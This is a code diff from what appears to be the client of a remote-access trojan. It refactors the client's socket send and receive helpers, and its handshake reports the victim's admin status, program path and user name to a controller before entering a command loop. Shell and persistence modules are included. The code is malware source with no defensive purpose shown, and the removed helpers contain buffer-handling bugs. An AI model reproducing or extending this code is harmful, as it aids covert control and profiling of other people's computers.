@@ -9,7 +9,7 @@
 #include "../inc/ModShell.h"
 #include "../inc/Persistence.h"
 #include "../inc/common.h"
-
+#include "../inc/other.h"
 
 using namespace  std;
 
@@ -21,135 +21,11 @@ HandShake::HandShake()
     a_current_directory = setCurrentDirectory();
     a_name_prog = NAME_PROG;
     a_location_prog = setLocationProg();
-
-    a_timeout.tv_sec = TIMEOUT_SOCK;
-    a_timeout.tv_usec = 0;
     cout << " Constructor is ok" << endl;
 }
 void HandShake::setSock(int sock)
 {
     a_sock = sock;
-}
-
-void HandShake::sendUltraSafe(string data)
-{
-    int len_send=0;
-    int len_recv=0;
-    char buffer[BUFFER_LEN];
-    string result;
-    if(strlen(buffer) > 0)
-    {
-        //clean buffer
-        cout << "Clean buffer in sendUltrasafe " << endl;
-        memset(buffer, 0, sizeof(buffer));
-    }
-
-    len_send = send(a_sock, data.c_str(), strlen(data.c_str()), 0);
-    if(len_send == SOCKET_ERROR)
-    {
-        //error
-        cout << "error " << endl;
-    }
-    else
-    {   
-        struct fd_set fds;
-
-        FD_ZERO(&fds);
-        FD_SET(a_sock, &fds);
-    
-        int selectSock = select(0, &fds, 0, 0, &a_timeout);
-        if(selectSock > 0)
-        {
-            len_recv = recv(a_sock, buffer, sizeof(buffer), 0);
-            result.append(buffer, len_recv);
-            //cout << "buffer in sendultrasafe: " << result << endl;
-            //cout << "Buffer len sendultrasafe: " << result.length() << "|"<< strlen("confirmation") << endl;
-
-            if(result == "confirmation")
-            {
-                ;
-                //cout << "confirmation ok ! in sendUltraSafe" << endl;
-            }
-            
-            else
-            {
-                cout << "ERROR in sendUltraSafe confirmation: "  << endl;
-            }
-
-        }
-        else if (selectSock == 0)
-        {
-            //timeout
-            ;        
-        }
-    }
-    
-}
-string HandShake::recvUltraSafe()
-{
-    //https://forum.hardware.fr/hfr/Programmation/C-2/resolu-timeout-existe-sujet_34270_1.htm
-
-    char buffer[BUFFER_LEN];
-
-   // cout << strlen(buffer) << endl;
-   // cout <<  sizeof(buffer) << endl;
-  
-    if(strlen(buffer) > 0)
-    {
-        //clean buffer
-       // cout << "Clean " << endl;
-        memset(buffer, 0, sizeof(buffer));
-    }
-    
-    struct fd_set fds;
-
-    FD_ZERO(&fds);
-    FD_SET(a_sock, &fds);
-    
-    int selectSock = select(0, &fds, 0, 0, &a_timeout);
-    
-    if(selectSock > 0)
-    {
-        //while (true)
-        //Sleep(SLEEP_RECV);
-        int len_recv= recv(a_sock, buffer, sizeof(buffer), 0);
-        if(len_recv == SOCKET_ERROR)
-        {
-            cout << "Error socket error  ///" << endl;
-            return (string) "ERROR";
-        }
-        else if (len_recv == 0)
-        {
-            //pass
-            cout << "pass" << endl;
-        }
-    }
-    else if (selectSock == 0)
-    {
-        //Timeout
-        //cout << "TIMEOUT recv !!" << endl;
-        //Stop
-        return (string) "TIMEOUT";
-    }
-
-    int len_send = send(a_sock, "confirmation", strlen("confirmation"), 0);
-
-    if(len_send == SOCKET_ERROR)
-    {
-        return (string) "SEND_ERROR";
-    }
-   
-    if(strlen(buffer) == 0)
-    {
-        //empty buffer
-        return ""; 
-    }
-    else
-    {
-        //cout << buffer << endl;
-        return (string) buffer;    
-    }
-    
 }
 int HandShake::startHandShake()
 {
@@ -174,10 +50,10 @@ int HandShake::startHandShake()
     string path_prog = "MOD_HANDSHAKE_PATH_PROG | "+ a_location_prog;
     string name_user = "MOD_HANDSHAKE_NAME_USER  | "+ a_name_user;
 
-    sendUltraSafe(is_admin);
-    sendUltraSafe(path_prog);
-    sendUltraSafe(name_user);
-    sendUltraSafe("\r\n");
+    sendUltraSafe(a_sock, is_admin);
+    sendUltraSafe(a_sock, path_prog);
+    sendUltraSafe(a_sock, name_user);
+    sendUltraSafe(a_sock, "\r\n");
 
 
 //010101010100101010101010101001010101010010101001010101011101010100101010100101010101010010101010101010100101
@@ -201,7 +77,7 @@ int HandShake::startHandShake()
             break;
         }
 
-        string result = recvUltraSafe();
+        string result = recvUltraSafe(a_sock);
         
         index =  result.find("|");
         cout << "INDEX: " << index << endl;
